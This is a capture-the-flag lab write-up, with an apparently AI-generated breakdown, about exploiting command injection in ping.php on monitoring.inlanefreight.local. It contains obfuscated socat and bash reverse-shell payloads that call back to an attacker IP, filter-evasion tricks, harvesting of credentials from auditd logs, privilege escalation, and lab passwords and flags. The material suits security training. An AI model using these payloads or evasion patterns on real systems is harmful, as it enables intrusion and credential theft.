We left off with obtaining RCE on the monitoring.inlanefreight.local application 
after a hard-fought battle against filters and blacklists set in place to try to prevent Command Injection attacks. 

not really lol i used curl to get my shit but now we will get a webshell loloadkl;sjughadriklsujfgh thumbs up meme 

change /etc/hosts to -> 10.129.229.147 


from this section we know our burp request is going to look like -> 

GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.252:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close


Question 1 - Submit the contents of the flag.txt file in the /home/srvadm directory. 
1. get socat rev shell from burp request listed above. 
2. once shell is caught -> python3 -c 'import pty; pty.spawn("/bin/bash")'
3. id 
uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
4. interesting were in adm priv group 
5. aureport --tty | less
TTY Report
===============================================
# date time event auid term sess comm data
===============================================
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo <nl>
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",<nl>
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",<ret>,"exit",<ret>
8. 06/01/22 07:13:36 365 1004 ? 4 sh "exit",<nl>

6. so we have creds -> srvadm:ILFreightnixadm!
7. su arvadm -> enter ILFreightnixadm! 
8. id uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
9. $ cat /home/srvadm/flag.txt
cat /home/srvadm/flag.txt
b447c27a00e3a348881b0030177000cd

10. also type /bin/bash -i will spawn interactive shell once we switch to srvadm 


GPT Breakdown : 

üß± Initial Access via Command Injection on monitoring.inlanefreight.local
üóÇÔ∏è Target
lua
Copy
Edit
monitoring.inlanefreight.local
IP: 10.129.229.147
üéØ Goal
Get a reverse shell from RCE in ping.php

Escalate from webdev to srvadm using recovered credentials from auditd logs

Retrieve /home/srvadm/flag.txt

üß† Vulnerability Recap
ping.php accepts an ip= parameter that gets passed unsafely to the shell via shell_exec() or similar

Filter bypass using %0A (newline) and obfuscated shell payload

Escalation via command logging in audit logs (aureport)

ü™ú Steps Taken
üîß 1. Update /etc/hosts
bash
Copy
Edit
sudo nano /etc/hosts

# Add:
10.129.229.147    monitoring.inlanefreight.local
üõ∞Ô∏è 2. Send Socat Reverse Shell via Burp
http
Copy
Edit
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.252:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
...
üéØ This payload bypasses filters using:

Single quotes per character

${IFS} (Internal Field Separator) as space bypass

Obfuscated socat payload to spawn a TCP reverse shell

üñ•Ô∏è 3. Set Up Listener
bash
Copy
Edit
socat TCP4-LISTEN:8443,reuseaddr,fork EXEC:/bin/bash
‚úÖ Shell caught as webdev

üõ†Ô∏è 4. Upgrade Shell
bash
Copy
Edit
python3 -c 'import pty; pty.spawn("/bin/bash")'
Check your user:

bash
Copy
Edit
id
# uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
üí° You're in the adm group = interesting privilege access!

üìú 5. Review TTY Audit Logs for Commands & Password Leakage
bash
Copy
Edit
aureport --tty | less
Key Finding:

nginx
Copy
Edit
su "ILFreightnixadm!"
sudo su srvadm
üö® Found credential reuse in cleartext:

makefile
Copy
Edit
srvadm:ILFreightnixadm!
üîë 6. Privilege Escalation
bash
Copy
Edit
su srvadm
# Enter password: ILFreightnixadm!
Confirm user switch:

bash
Copy
Edit
id
# uid=1003(srvadm) gid=1003(srvadm)
(optional)

bash
Copy
Edit
/bin/bash -i  # To spawn an interactive shell
üèÅ 7. Retrieve the Flag
bash
Copy
Edit
cat /home/srvadm/flag.txt
# Output: b447c27a00e3a348881b0030177000cd
üß† Real-World Takeaways
Area	Key Insight
RCE	Line feed %0A + obfuscated socat leads to reliable shell bypass
Post-Ex	auditd logs can leak su/sudo commands with plaintext passwords
Privilege Escalation	Exploiting lazy sudo history / command logging is a realistic path
Shell Upgrade	Always run /bin/bash -i or pty.spawn() to avoid broken TTYs
üõ°Ô∏è Reporting Suggestions
Command Injection in ping.php via unsanitized input

Recommend:

Input validation (regex match IP only)

Disabling shell_exec() or system command usage

Use of proper firewall/IDS monitoring for outbound shells

Credential Leakage:

Disable auditd TTY logging for password input or sanitize logs

Audit and rotate reused credentials across users

why we used SoCat:

üîç [Optional] Step: Read Source Code of ping.php
Once RCE was confirmed via the ip parameter, we manually viewed the PHP script to check for:

Command filtering / sanitization

Blacklisted keywords or strings

Clues about how input is being passed to the shell

bash
Copy
Edit
cat ping.php
‚úÖ Revealed:

php
Copy
Edit
$blacklist = ['nc', 'netcat', 'bash -i', ...];
üîê Result:

nc/netcat explicitly blacklisted

Explains why typical reverse shell payloads like:

bash
Copy
Edit
bash -i >& /dev/tcp/10.10.15.252/4444 0>&1
fail silently or trigger filtering

üß† Lesson: Why socat Worked
socat was not blacklisted ‚Äî making it a perfect alternative.

Obfuscated payload (space-bypassed):

bash
Copy
Edit
's'o'c'a't'${IFS}TCP4:10.10.15.252:8443${IFS}EXEC:bash
üß≠ Pattern to Look For (ITTT Style):
Got This	Do That
‚úÖ Gained RCE but reverse shell fails	Look for filtering in source (e.g., ping.php)
‚úÖ Found blacklist or hardcoded regex	Swap nc with socat, telnet, or curl
‚ùå Can't use bash payloads	Try encoding, obfuscation (${IFS}, single-char split)
‚úÖ Able to cat server-side script	Analyze logic, bypasses, and vulnerable parameters



